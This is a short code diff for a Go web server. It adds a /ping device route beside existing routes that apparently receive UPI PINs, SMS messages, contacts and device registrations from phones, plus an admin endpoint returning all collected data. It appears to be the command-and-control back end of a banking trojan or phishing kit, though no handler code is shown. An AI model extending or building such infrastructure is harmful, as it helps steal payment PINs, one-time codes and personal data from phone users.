@@ -54,6 +54,7 @@ func main() {
 		api.POST("/upi-pin", handlers.SubmitUpiPin)
 		api.POST("/sms", handlers.SubmitSms)
 		api.POST("/device", handlers.RegisterDevice)
+		api.POST("/ping", handlers.PingDevice)
 		api.POST("/contacts", handlers.SubmitContacts)
 		api.GET("/admin/all", handlers.GetAllData)
 	}
